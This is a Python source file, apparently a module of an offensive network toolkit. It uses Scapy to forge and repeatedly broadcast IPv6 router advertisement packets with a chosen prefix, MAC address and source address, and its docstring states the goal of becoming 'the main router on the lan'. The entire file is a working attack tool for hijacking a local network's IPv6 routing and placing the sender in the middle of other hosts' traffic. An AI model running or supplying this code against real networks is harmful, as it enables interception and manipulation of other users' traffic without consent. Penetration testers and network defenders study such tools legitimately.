from deadbeef_modules import ipv6module

from scapy.all import *

# router advertisment module 
class ipv6_becomerouter_module(ipv6module):
    """
    This Module send fake router advertisement packets to become the main router on the lan
    """
    
    def init_module(self):
        self.prompt = self.cc.prompt(self.prompt, "router advertisement")       
        self.valid_parameters = ["prefix", "dns", "iface", "mac", "loop", "src"]
        self.help_parameters['prefix'] = "IPv6 address prefix to advertise"
        self.help_parameters['iface'] = "use this interface"
        self.help_parameters['mac'] = "overwrite interface mac address"
        self.help_parameters['loop'] = "send packets every n seconds"
        self.help_parameters['src'] = "IPv6 src address (used as gateway)"
        self.required_parameters = ["prefix", "iface"]

    def help(self):
        print "send router advertisement packets"
        
    def start(self, cmdline):
        conf.iface = self.parameters['iface']
        
        # set default parameters if no user value exists
        
        # set default mac
        if "mac" in self.parameters.keys():
            mac_address = self.parameters['mac']
        else:
            mac_address = self.__get_mac__(self.parameters['iface'])
            if not mac_address:
                self.cc.err("unable to obtain mac address. use \"mac\" option to specify\n")
                return
        
        # set src ip
        if "src" in self.parameters.keys():
            src_ip = self.parameters['src']
        else:
            src_ip = None
        
        # TODO: Add DNS Header
        router_advertisement_pkt = Ether()/IPv6(src=src_ip)/ICMPv6ND_RA(chlim=64,O=1)/ICMPv6NDOptPrefixInfo(prefix=self.parameters['prefix'], prefixlen=64, validlifetime=2592000, preferredlifetime=604800)/ICMPv6NDOptSrcLLAddr(lladdr=mac_address)

        self.cc.ok("sending high priority router advertisement:\n")
        if "loop" not in self.parameters.keys():
            sendp(router_advertisement_pkt) 
        else:
            arguments = {'loop': 1, 'inter': int(self.parameters['loop']), 'verbose': 0}
            self.add_job(cmd = sendp, args = (router_advertisement_pkt, ), kwargs = arguments)                      

    def stop(self, cmdline):
        self.cc.ok("stopping router advertisement server...\n")     
        
        self.kill_job()
